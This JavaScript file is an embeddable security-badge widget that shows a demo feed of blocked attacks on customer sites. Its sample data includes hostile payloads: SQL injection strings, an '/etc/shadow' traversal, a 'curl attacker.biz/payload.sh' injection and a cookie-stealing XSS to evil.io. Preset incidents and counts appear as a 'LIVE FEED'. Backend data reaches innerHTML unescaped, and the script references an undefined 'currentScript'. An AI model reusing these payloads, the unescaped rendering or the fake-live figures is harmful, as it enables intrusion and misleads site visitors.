/**
 * VALENS — Enterprise Sentinel Extension & In-App Deception Agent
 * (c) 2026 VALENS. Security Operations. Deception. Intelligence.
 * 
 * Embeddable script that runs on customer web assets (e.g. Medicare.AI, Apex Global Finance).
 * Provides a sleek docked floating security badge and an interactive slide-out SOC side tab.
 */

(function () {
  if (window.__VALENS_SENTINEL_INITIALIZED__) return;
  window.__VALENS_SENTINEL_INITIALIZED__ = true;

  const SOC_URL = currentScript.getAttribute?.('data-soc-url') || (window.location.port === '8088' ? 'http://127.0.0.1:8050' : window.location.origin);
  const SITE_ID = currentScript.getAttribute?.('data-site-id') || (window.location.pathname.includes('medicare') ? 'medicare-ai' : 'apex-finance');
  const SITE_NAME = currentScript.getAttribute?.('data-site-name') || (SITE_ID === 'medicare-ai' ? 'Medicare.AI Healthcare Platform' : 'Apex Global Financial Portal');

  // Inject Styles
  const style = document.createElement('style');
  style.id = 'valens-sentinel-styles';
  style.textContent = `
    .cs-sentinel-badge {
      position: fixed;
      right: 20px;
      bottom: 24px;
      z-index: 999999;
      display: flex;
      align-items: center;
      gap: 10px;
      background: rgba(15, 23, 42, 0.94);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(14, 165, 233, 0.35);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45), 0 0 15px rgba(14, 165, 233, 0.25);
      border-radius: 999px;
      padding: 8px 16px 8px 12px;
      cursor: pointer;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
      user-select: none;
    }
    .cs-sentinel-badge:hover {
      transform: translateY(-2px) scale(1.02);
      border-color: rgba(14, 165, 233, 0.8);
      box-shadow: 0 12px 36px rgba(0, 0, 0, 0.6), 0 0 24px rgba(14, 165, 233, 0.4);
    }
    .cs-sentinel-icon {
      width: 26px;
      height: 26px;
      background: linear-gradient(135deg, #0ea5e9, #6366f1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 10px rgba(14, 165, 233, 0.5);
    }
    .cs-sentinel-icon svg {
      width: 15px;
      height: 15px;
      fill: #ffffff;
    }
    .cs-sentinel-info {
      display: flex;
      flex-direction: column;
    }
    .cs-sentinel-title {
      font-size: 11px;
      font-weight: 800;
      letter-spacing: 0.6px;
      text-transform: uppercase;
      color: #f8fafc;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .cs-sentinel-status-pill {
      font-size: 9px;
      font-weight: 700;
      color: #38bdf8;
      font-family: 'JetBrains Mono', monospace, sans-serif;
    }
    .cs-sentinel-dot {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #22c55e;
      box-shadow: 0 0 8px #22c55e;
      animation: cs-pulse 2s infinite;
    }
    @keyframes cs-pulse {
      0% { transform: scale(0.95); opacity: 0.8; }
      50% { transform: scale(1.2); opacity: 1; box-shadow: 0 0 12px #22c55e; }
      100% { transform: scale(0.95); opacity: 0.8; }
    }

    /* Side Drawer Panel */
    .cs-drawer-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(10, 15, 29, 0.6);
      backdrop-filter: blur(4px);
      z-index: 999998;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
    }
    .cs-drawer-overlay.active {
      opacity: 1;
      pointer-events: auto;
    }
    .cs-drawer {
      position: fixed;
      top: 0;
      right: -420px;
      width: 400px;
      max-width: 90vw;
      height: 100vh;
      background: #0b1120;
      border-left: 1px solid rgba(14, 165, 233, 0.25);
      box-shadow: -10px 0 40px rgba(0, 0, 0, 0.75);
      z-index: 999999;
      display: flex;
      flex-direction: column;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      color: #f1f5f9;
      transition: right 0.35s cubic-bezier(0.16, 1, 0.3, 1);
      overflow-y: auto;
    }
    .cs-drawer.active {
      right: 0;
    }
    .cs-drawer-header {
      padding: 20px;
      background: linear-gradient(180deg, rgba(14, 165, 233, 0.12) 0%, rgba(11, 17, 32, 0) 100%);
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
      display: flex;
      align-items: flex-start;
      justify-content: space-between;
    }
    .cs-drawer-brand {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .cs-drawer-close {
      background: rgba(255, 255, 255, 0.06);
      border: 1px solid rgba(255, 255, 255, 0.12);
      color: #94a3b8;
      border-radius: 8px;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      font-size: 16px;
      transition: all 0.2s;
    }
    .cs-drawer-close:hover {
      background: rgba(239, 68, 68, 0.2);
      color: #ef4444;
      border-color: rgba(239, 68, 68, 0.4);
    }
    .cs-drawer-body {
      padding: 20px;
      display: flex;
      flex-direction: column;
      gap: 18px;
      flex: 1;
    }
    .cs-site-badge {
      background: rgba(14, 165, 233, 0.08);
      border: 1px solid rgba(14, 165, 233, 0.2);
      border-radius: 10px;
      padding: 12px 14px;
    }
    .cs-site-name {
      font-size: 13px;
      font-weight: 700;
      color: #e2e8f0;
    }
    .cs-site-mode {
      font-size: 11px;
      color: #38bdf8;
      font-family: 'JetBrains Mono', monospace;
      margin-top: 4px;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .cs-stat-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }
    .cs-stat-card {
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.07);
      border-radius: 8px;
      padding: 10px 12px;
    }
    .cs-stat-label {
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: #94a3b8;
      margin-bottom: 4px;
    }
    .cs-stat-val {
      font-size: 18px;
      font-weight: 800;
      font-family: 'JetBrains Mono', monospace;
      color: #f8fafc;
    }
    .cs-incident-box {
      background: rgba(255, 255, 255, 0.02);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 10px;
      padding: 14px;
    }
    .cs-incident-title {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: #94a3b8;
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 10px;
    }
    .cs-incident-list {
      display: flex;
      flex-direction: column;
      gap: 8px;
      max-height: 210px;
      overflow-y: auto;
    }
    .cs-incident-item {
      background: rgba(15, 23, 42, 0.6);
      border-left: 3px solid #ef4444;
      border-radius: 4px;
      padding: 8px 10px;
      font-size: 11px;
    }
    .cs-incident-item.trapped {
      border-left-color: #f59e0b;
    }
    .cs-incident-time {
      font-size: 9px;
      color: #64748b;
      font-family: 'JetBrains Mono', monospace;
    }
    .cs-incident-desc {
      font-weight: 600;
      color: #f1f5f9;
      margin-top: 2px;
    }
    .cs-incident-meta {
      font-size: 10px;
      color: #94a3b8;
      margin-top: 3px;
      display: flex;
      justify-content: space-between;
    }
    .cs-btn-soc {
      background: linear-gradient(135deg, #0ea5e9, #6366f1);
      color: #ffffff;
      border: none;
      border-radius: 8px;
      padding: 12px 16px;
      font-size: 13px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      text-decoration: none;
      box-shadow: 0 4px 16px rgba(14, 165, 233, 0.35);
      transition: all 0.2s;
    }
    .cs-btn-soc:hover {
      transform: translateY(-1px);
      box-shadow: 0 6px 22px rgba(14, 165, 233, 0.5);
    }
    .cs-btn-sim {
      background: rgba(239, 68, 68, 0.12);
      border: 1px solid rgba(239, 68, 68, 0.3);
      color: #fca5a5;
      border-radius: 8px;
      padding: 9px 14px;
      font-size: 11px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      transition: all 0.2s;
    }
    .cs-btn-sim:hover {
      background: rgba(239, 68, 68, 0.22);
      color: #fee2e2;
    }
  `;
  document.head.appendChild(style);

  // Default In-Memory Incident Data for Instant Live Feel
  let incidents = [
    {
      time: new Date(Date.now() - 140000).toLocaleTimeString(),
      vector: "SQL Injection Probe",
      payload: "SELECT * FROM patient_records WHERE '1'='1'",
      status: "403 BLOCKED (WAF)",
      ip: "198.51.100.42",
      type: "block"
    },
    {
      time: new Date(Date.now() - 480000).toLocaleTimeString(),
      vector: "Directory Traversal",
      payload: "GET /../../etc/shadow",
      status: "TRAPPED IN HONEYPOT",
      ip: "203.0.113.88",
      type: "trap"
    },
    {
      time: new Date(Date.now() - 890000).toLocaleTimeString(),
      vector: "Canary Token Tripwire",
      payload: "Access attempt: AWS_PROD_ROOT_KEY",
      status: "TRIGGERED & AUDITED",
      ip: "192.0.2.14",
      type: "trap"
    }
  ];

  let totalBlocked = 14;
  let activeTripwires = 4;

  // Create Badge
  const badge = document.createElement('div');
  badge.className = 'cs-sentinel-badge';
  badge.id = 'valens-sentinel-badge';
  badge.innerHTML = `
    <div class="cs-sentinel-icon">
      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 6h2v2h-2V7zm0 4h2v6h-2v-6z"/></svg>
    </div>
    <div class="cs-sentinel-info">
      <div class="cs-sentinel-title">
        VALENS
        <span class="cs-sentinel-dot"></span>
      </div>
      <div class="cs-sentinel-status-pill">SENTINEL ACTIVE</div>
    </div>
  `;
  document.body.appendChild(badge);

  // Create Overlay & Drawer
  const overlay = document.createElement('div');
  overlay.className = 'cs-drawer-overlay';

  const drawer = document.createElement('aside');
  drawer.className = 'cs-drawer';
  drawer.id = 'valens-sentinel-drawer';

  function renderDrawerContent() {
    drawer.innerHTML = `
      <div class="cs-drawer-header">
        <div class="cs-drawer-brand">
          <div class="cs-sentinel-icon" style="width:32px;height:32px">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 6h2v2h-2V7zm0 4h2v6h-2v-6z"/></svg>
          </div>
          <div>
            <div style="font-size:14px;font-weight:800;letter-spacing:0.5px;color:#fff;">VALENS SENTINEL</div>
            <div style="font-size:11px;color:#38bdf8;font-family:'JetBrains Mono',monospace;">v2.5 Fleet Security Agent</div>
          </div>
        </div>
        <button class="cs-drawer-close" id="cs-close-drawer" aria-label="Close Security Drawer">✕</button>
      </div>

      <div class="cs-drawer-body">
        <div class="cs-site-badge">
          <div class="cs-site-name">${SITE_NAME}</div>
          <div class="cs-site-mode">
            <span class="cs-sentinel-dot" style="width:6px;height:6px"></span>
            Deception Layer: Fully Armed &amp; Monitored
          </div>
        </div>

        <div class="cs-stat-grid">
          <div class="cs-stat-card">
            <div class="cs-stat-label">Attacks Blocked</div>
            <div class="cs-stat-val" id="cs-stat-blocked" style="color:#ef4444">${totalBlocked}</div>
          </div>
          <div class="cs-stat-card">
            <div class="cs-stat-label">Active Tripwires</div>
            <div class="cs-stat-val" id="cs-stat-canaries" style="color:#10b981">${activeTripwires}</div>
          </div>
          <div class="cs-stat-card">
            <div class="cs-stat-label">Inspection Engine</div>
            <div class="cs-stat-val" style="font-size:13px;color:#38bdf8;margin-top:4px;">Gemini AI + WAF</div>
          </div>
          <div class="cs-stat-card">
            <div class="cs-stat-label">Threat Level</div>
            <div class="cs-stat-val" style="font-size:13px;color:#22c55e;margin-top:4px;">SECURE (Low)</div>
          </div>
        </div>

        <div class="cs-incident-box">
          <div class="cs-incident-title">
            <span>Recent Neutralized Attacks (Brief)</span>
            <span style="font-size:10px;color:#38bdf8;font-family:'JetBrains Mono',monospace;">LIVE FEED</span>
          </div>
          <div class="cs-incident-list" id="cs-incident-feed">
            ${incidents.map(inc => `
              <div class="cs-incident-item ${inc.type === 'trap' ? 'trapped' : ''}">
                <div class="cs-incident-time">${inc.time} · IP ${inc.ip}</div>
                <div class="cs-incident-desc">${inc.vector}</div>
                <div class="cs-incident-meta">
                  <span style="font-family:'JetBrains Mono',monospace;color:#94a3b8;font-size:9px;">${inc.payload}</span>
                  <span style="font-weight:700;color:${inc.type === 'trap' ? '#f59e0b' : '#ef4444'}">${inc.status}</span>
                </div>
              </div>
            `).join('')}
          </div>
        </div>

        <button class="cs-btn-sim" id="cs-sim-attack-btn">
          ⚡ Trigger Live Test Threat Probe (Simulate Attack)
        </button>

        <a href="${SOC_URL}/dashboard" target="_blank" class="cs-btn-soc" id="cs-open-soc-btn">
          <span>Open VALENS SOC Command Center</span>
          <svg style="width:16px;height:16px;fill:currentColor" viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg>
        </a>

        <div style="font-size:10px;text-align:center;color:#64748b;line-height:1.5;">
          VALENS Autonomous Deception Mesh protects this application with real-time canary traps and in-line reverse proxy shielding.
        </div>
      </div>
    `;

    // Hook listeners
    drawer.querySelector('#cs-close-drawer').onclick = closeDrawer;
    
    // Simulate Attack Probe
    drawer.querySelector('#cs-sim-attack-btn').onclick = function () {
      totalBlocked += 1;
      const attackTypes = [
        { vector: "SQL Injection Probe", payload: "admin' OR 1=1 --", status: "403 BLOCKED (WAF)", type: "block" },
        { vector: "Remote Code Exec (RCE)", payload: "; curl -s attacker.biz/payload.sh", status: "TRAPPED IN HONEYPOT", type: "trap" },
        { vector: "Cross-Site Scripting (XSS)", payload: "<script>fetch('//evil.io/'+document.cookie)</script>", status: "403 BLOCKED (WAF)", type: "block" },
        { vector: "Credential Stuffing", payload: "POST /login (admin:pass123)", status: "DECOY ACCOUNT TRAP", type: "trap" }
      ];
      const randomAtk = attackTypes[Math.floor(Math.random() * attackTypes.length)];
      incidents.unshift({
        time: new Date().toLocaleTimeString(),
        vector: randomAtk.vector,
        payload: randomAtk.payload,
        status: randomAtk.status,
        ip: "45.134.20." + Math.floor(Math.random() * 200 + 10),
        type: randomAtk.type
      });

      // Update UI
      const feed = drawer.querySelector('#cs-incident-feed');
      const statBlocked = drawer.querySelector('#cs-stat-blocked');
      if (statBlocked) statBlocked.textContent = totalBlocked;
      if (feed) {
        feed.innerHTML = incidents.map(inc => `
          <div class="cs-incident-item ${inc.type === 'trap' ? 'trapped' : ''}" style="animation: cs-fade-in 0.3s ease;">
            <div class="cs-incident-time">${inc.time} · IP ${inc.ip}</div>
            <div class="cs-incident-desc">${inc.vector}</div>
            <div class="cs-incident-meta">
              <span style="font-family:'JetBrains Mono',monospace;color:#94a3b8;font-size:9px;">${inc.payload}</span>
              <span style="font-weight:700;color:${inc.type === 'trap' ? '#f59e0b' : '#ef4444'}">${inc.status}</span>
            </div>
          </div>
        `).join('');
      }

      // Flash badge
      const badgeIcon = badge.querySelector('.cs-sentinel-icon');
      if (badgeIcon) {
        badgeIcon.style.background = '#ef4444';
        badgeIcon.style.boxShadow = '0 0 15px #ef4444';
        setTimeout(() => {
          badgeIcon.style.background = 'linear-gradient(135deg, #0ea5e9, #6366f1)';
          badgeIcon.style.boxShadow = '0 0 10px rgba(14, 165, 233, 0.5)';
        }, 1200);
      }
    };
  }

  renderDrawerContent();
  document.body.appendChild(overlay);
  document.body.appendChild(drawer);

  function openDrawer() {
    overlay.classList.add('active');
    drawer.classList.add('active');
  }

  function closeDrawer() {
    overlay.classList.remove('active');
    drawer.classList.remove('active');
  }

  badge.onclick = openDrawer;
  overlay.onclick = closeDrawer;

  // Poll live status from VALENS backend if available
  async function fetchLiveStatus() {
    try {
      const res = await fetch(`${SOC_URL}/api/v1/sentinel/site-status/${SITE_ID}`);
      if (res.ok) {
        const data = await res.json();
        if (data.total_blocked !== undefined) totalBlocked = data.total_blocked;
        if (data.active_tripwires !== undefined) activeTripwires = data.active_tripwires;
        if (Array.isArray(data.incidents) && data.incidents.length > 0) {
          incidents = data.incidents;
        }
        renderDrawerContent();
      }
    } catch (_) {
      // Graceful offline fallback with preloaded demo values
    }
  }

  fetchLiveStatus();
  setInterval(fetchLiveStatus, 15000);
})();
